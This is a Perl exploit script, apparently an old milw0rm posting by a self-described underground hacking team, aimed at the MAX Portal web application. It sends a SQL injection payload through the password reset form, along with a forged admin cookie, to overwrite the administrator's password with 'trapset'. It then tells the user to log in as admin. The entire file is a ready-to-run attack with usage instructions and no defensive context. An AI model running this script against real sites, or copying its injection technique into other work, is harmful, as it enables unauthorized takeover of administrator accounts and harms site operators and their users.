#!/usr/bin/perl
#################################################################
#    T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
#################################################################
# EXPLOIT FOR - MAX Portal (All Versions)
#
#Exploit By :  A l p h a _ P r o g r a m m e r ( Sirus-v );
#E-Mail : Alpha_Programmer@Yahoo.com
#
#This Xpl Change Admin's Pass in This Portal !!
#
#Discovered by: s d <irsdl@yahoo.com>
#
#################################################################
#  Gr33tz To ==>   mh_p0rtal , Oil_karchack , Str0ke   &  AlphaST.Com
#
#And Iranian Hacking & Security Teams :
# IHS , Shabgard , Emperor ,Crouz & Simorgh-ev
#################################################################
use IO::Socket;

if (@ARGV < 2)
{
 print "\n==========================================\n";
 print " \n     -- Exploit By Alpha Programmer --\n\n";
 print "     Trap-Set Underground Hacking Team      \n\n";
 print "      Usage: Max.pl <T4rg3t> <V3rsion>\n\n";
 print " V3rsion :\n";
 print " 1 ==>   Version 1.35 and 0lder\n";
 print " 2 ==>   Version 1.36, 2.0 and Next\n";
 print "==========================================\n\n";
 print "Example:\n\n";
 print "    Max.pl www.Site.com 1\n";
 exit();
}
$hell = "foo' or M_Name='admin";
if ($ARGV[1] =~"2" ){$hell = "foo%27%29+or+M_Name%3D%27admin%27+or+%28%271%27%3D%272"};


my $host = $ARGV[0];
my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,
PeerPort => "80" );

unless ($remote) { die "C4nn0t C0nn3ct to $host" }

print "C0nn3cted\n";

$http = "POST /password.asp?mode=reset HTTP/1.0";
$http .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\n";
$http .= "Accept-Language: fa\n";
$http .= "Content-Type: application/x-www-form-urlencoded\n";
$http .= "Pragma: no-cache\n";
$http .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)\n";
$http .= "Host: $host\n";
$http .= "Content-Length: 111\n";
$http .= "Proxy-Connection: Keep-Alive\n";
$http .= "Cookie: SSOComhide=Name=admin; SSOComUser=Cookies=&Pword=d7fae5da3d785535c12b70865519ba86&Name=admin\n\n";

$http .= "pass=trapset&pass2=trapset&memId=-1&memKey=$hell&Submit=Submit\n\n\n\n";

print "\n";
print $remote $http;
sleep(1);
print "[+] Attacking ...\n";
print "[+] Changing Admin's Password ...\n";
while (<$remote>)
{
}
print "\nNow Go to $host and Login With :\n\n";
print "User: admin\n";
print "Pass: trapset\n\n";
print "Enjoy ;)\n";
print "\n";
### EOF ###

# milw0rm.com [2005-05-26]